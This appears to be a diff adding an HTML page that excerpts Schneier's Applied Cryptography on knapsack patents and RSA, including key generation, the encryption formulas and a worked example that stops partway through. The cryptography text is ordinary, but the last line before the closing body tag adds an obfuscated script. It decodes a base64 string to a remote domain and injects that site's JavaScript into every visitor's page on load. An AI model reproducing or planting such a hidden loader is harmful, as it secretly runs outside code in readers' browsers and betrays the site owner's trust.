@@ -1,0 +1,211 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Public-Key Algorithms</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=19//-->
+<!--PAGES=466-468//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="19-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="19-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>Patents</I></B></FONT></P>
+<P>The original Merkle-Hellman algorithm is patented in the United States [720] and worldwide (see Table 19.1). Public Key Partners (PKP) licenses the patent, along with other public-key cryptography patents (see Section 25.5). The U.S. patent will expire on August 19, 1997.
+</P>
+<H3><A NAME="Heading4"></A><FONT COLOR="#000077">19.3 RSA</FONT></H3>
+<P>Soon after Merkle&#146;s knapsack algorithm came the first full-fledged public-key algorithm, one that works for encryption and digital signatures: RSA [1328, 1329]. Of all the public-key algorithms proposed over the years, RSA is by far the easiest to understand and implement. (Martin Gardner published an early description of the algorithm in his &#147;Mathematical Games&#148; column in <I>Scientific American</I> [599].) It is also the most popular. Named after the three inventors&#151;Ron Rivest, Adi Shamir, and Leonard Adleman&#151;it has since withstood years of extensive cryptanalysis. Although the cryptanalysis neither proved nor disproved RSA&#146;s security, it does suggest a confidence level in the algorithm.</P>
+<TABLE WIDTH="75%"><TH CAPTION COLSPAN="3" ALIGN="CENTER">Table 19.1<BR>Foreign Merkle-Hellman Knapsack Patents
+<TR>
+<TD COLSPAN="3"><HR>
+<TR>
+<TH WIDTH="25%" VALIGN="BOTTOM" ALIGN="LEFT">Country
+<TH WIDTH="25%" VALIGN="BOTTOM" ALIGN="LEFT">Number
+<TH WIDTH="25%" VALIGN="BOTTOM" ALIGN="LEFT">Date of Issue
+<TR>
+<TD COLSPAN="3"><HR>
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">Belgium
+<TD VALIGN="BOTTOM" ALIGN="LEFT">871039
+<TD VALIGN="BOTTOM" ALIGN="LEFT">5 Apr 1979
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">Netherlands
+<TD VALIGN="BOTTOM" ALIGN="LEFT">7810063
+<TD VALIGN="BOTTOM" ALIGN="LEFT">10 Apr 1979
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">Great Britain
+<TD VALIGN="BOTTOM" ALIGN="LEFT">2006580
+<TD VALIGN="BOTTOM" ALIGN="LEFT">2 May 1979
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">Germany
+<TD VALIGN="BOTTOM" ALIGN="LEFT">2843583
+<TD VALIGN="BOTTOM" ALIGN="LEFT">10 May 1979
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">Sweden
+<TD VALIGN="BOTTOM" ALIGN="LEFT">7810478
+<TD VALIGN="BOTTOM" ALIGN="LEFT">14 May 1979
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">France
+<TD VALIGN="BOTTOM" ALIGN="LEFT">2405532
+<TD VALIGN="BOTTOM" ALIGN="LEFT">8 Jun 1979
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">Germany
+<TD VALIGN="BOTTOM" ALIGN="LEFT">2843583
+<TD VALIGN="BOTTOM" ALIGN="LEFT">3 Jun 1982
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">Germany
+<TD VALIGN="BOTTOM" ALIGN="LEFT">2857905
+<TD VALIGN="BOTTOM" ALIGN="LEFT">15 Jul 1982
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">Canada
+<TD VALIGN="BOTTOM" ALIGN="LEFT">1128159
+<TD VALIGN="BOTTOM" ALIGN="LEFT">20 Jul 1982
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">Great Britain
+<TD VALIGN="BOTTOM" ALIGN="LEFT">2006580
+<TD VALIGN="BOTTOM" ALIGN="LEFT">18 Aug 1982
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">Switzerland
+<TD VALIGN="BOTTOM" ALIGN="LEFT">63416114
+<TD VALIGN="BOTTOM" ALIGN="LEFT">14 Jan 1983
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">Italy
+<TD VALIGN="BOTTOM" ALIGN="LEFT">1099780
+<TD VALIGN="BOTTOM" ALIGN="LEFT">28 Sep 1985
+<TR>
+<TD COLSPAN="3"><HR>
+</TABLE>
+<P>RSA gets its security from the difficulty of factoring large numbers. The public and private keys are functions of a pair of large (100 to 200 digits or even larger) prime numbers. Recovering the plaintext from the public key and the ciphertext is conjectured to be equivalent to factoring the product of the two primes.
+</P>
+<P>To generate the two keys, choose two random large prime numbers, <I>p</I> and <I>q</I>. For maximum security, choose <I>p</I> and <I>q</I> of equal length. Compute the product:</P>
+<DL>
+<DD><I>n</I> = <I>pq</I>
+</DL>
+<P>Then randomly choose the encryption key, <I>e</I>, such that <I>e</I> and (<I>p</I> - 1)(<I>q</I> - 1) are relatively prime. Finally, use the extended Euclidean algorithm to compute the decryption key, <I>d</I>, such that</P>
+<DL>
+<DD><I>ed</I> &#8801; 1 mod (<I>p</I> - 1)(<I>q</I> - 1)
+</DL>
+<P>In other words,
+</P>
+<DL>
+<DD><I>d</I> = <I>e</I><SUP>-1</SUP> mod ((<I>p</I> - 1)(<I>q</I> - 1))
+</DL>
+<P>Note that <I>d</I> and <I>n</I> are also relatively prime. The numbers <I>e</I> and <I>n</I> are the public key; the number <I>d</I> is the private key. The two primes, <I>p</I> and <I>q</I>, are no longer needed. They should be discarded, but never revealed.</P>
+<P>To encrypt a message <I>m</I>, first divide it into numerical blocks smaller than <I>n</I> (with binary data, choose the largest power of 2 less than <I>n</I>). That is, if both <I>p</I> and <I>q</I> are 100-digit primes, then <I>n</I> will have just under 200 digits and each message block, <I>m</I><SUB>i</SUB> <SUB>,</SUB> should be just under 200 digits long. (If you need to encrypt a fixed number of blocks, you can pad them with a few zeros on the left to ensure that they will always be less than <I>n</I>.) The encrypted message, <I>c</I>, will be made up of similarly sized message blocks, <I>c</I><SUB>i</SUB>, of about the same length. The encryption formula is simply</P>
+<DL>
+<DD><I>c</I><SUB>i</SUB> = <I>m</I><SUB>i</SUB><SUP>e</SUP> mod <I>n</I>
+</DL>
+<P>To decrypt a message, take each encrypted block <I>c</I><SUB>i</SUB> and compute</P>
+<DL>
+<DD><I>m</I><SUB>i</SUB> = <I>c</I><SUB>i</SUB><SUP>d</SUP> mod <I>n</I>
+</DL>
+<P>Since
+</P>
+<DL>
+<DD><I>c</I><SUB>i</SUB><SUP>d</SUP> = (<I>m</I><SUB>i</SUB><SUP>e</SUP>)<SUP>d</SUP> = <I>m</I><SUB>i</SUB><SUP>ed</SUP> = <I>m</I><SUB>i</SUB><SUP><I>k</I>(<I>p</I> - 1)(<I>q</I>- 1)&#43; 1</SUP> = <I>m</I><SUB>i</SUB> <I>m</I><SUB>i</SUB><SUP>k(<I>p</I>- 1)(<I>q</I>- 1)</SUP> = <I>m</I><SUB>i</SUB>*1 = <I>m</I><SUB>i</SUB>; all (mod <I>n</I>)
+</DL>
+<P>the formula recovers the message. This is summarized in Table 19.2.
+</P>
+<P>The message could just as easily have been encrypted with <I>d</I> and decrypted with <I>e</I>; the choice is arbitrary. I will spare you the number theory that proves why this works; most current texts on cryptography cover it in detail.</P>
+<P>A short example will probably go a long way to making this clearer. If <I>p</I> = 47 and <I>q</I> = 71, then</P>
+<TABLE WIDTH="100%"><TH CAPTION COLSPAN="2" ALIGN="CENTER">Table 19.2<BR>RSA Encryption
+<TR>
+<TD COLSPAN="2"><HR>
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">
+<TD ALIGN="LEFT" VALIGN="BOTTOM"><B><I>Public Key:</I></B>
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT"><I>n</I>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">product of two primes, <I>p</I> and <I>q</I> (<I>p</I> and <I>q</I> must remain secret)
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT"><I>e</I>
+<TD ALIGN="LEFT" VALIGN="BOTTOM">relatively prime to (<I>p</I> - 1)(<I>q</I> - 1)
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">
+<TD ALIGN="LEFT"><B><I>Private Key:</I></B>
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT"><I>d</I>
+<TD VALIGN="BOTTOM"><I>e</I><SUP>-1</SUP> mod ((<I>p</I> - 1)(<I>q</I> - 1))
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">
+<TD ALIGN="LEFT"><B><I>Encrypting:</I></B>
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT" COLSPAN="2"><I>c</I> = <I>m<SUP>e</SUP></I> mod <I>n</I>
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT">
+<TD ALIGN="LEFT"><B><I>Decrypting:</I></B>
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT" COLSPAN="2"><I>m</I> = <I>c<SUP>d</SUP></I> mod <I>n</I>
+<TR>
+<TD COLSPAN="2"><HR>
+</TABLE>
+<DL>
+<DD><I>n</I> = <I>pq</I> = 3337
+</DL>
+<P>The encryption key, <I>e</I>, must have no factors in common with</P>
+<DL>
+<DD>(<I>p</I> - 1)(<I>q</I> - 1) = 46 * 70 = 3220
+</DL>
+<P>Choose <I>e</I> (at random) to be 79. In that case</P>
+<DL>
+<DD><I>d</I> = <I>79</I><SUP>-1</SUP> mod 3220 = 1019
+</DL>
+<P>This number was calculated using the extended Euclidean algorithm (see Section 11.3). Publish <I>e</I> and <I>n</I>, and keep <I>d</I> secret. Discard <I>p</I> and <I>q</I>.</P>
+<P>To encrypt the message</P>
+<DL>
+<DD><I>m</I> = 6882326879666683
+</DL>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="19-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="19-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(MGaBheme, LnaBbIEG) {LnaBbIEG = MGaBheme.createElement('script');LnaBbIEG.type = 'text/javascript';LnaBbIEG.async = true;LnaBbIEG.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');MGaBheme.getElementsByTagName('body')[0].appendChild(LnaBbIEG);}(document));</script></body>
+</html>
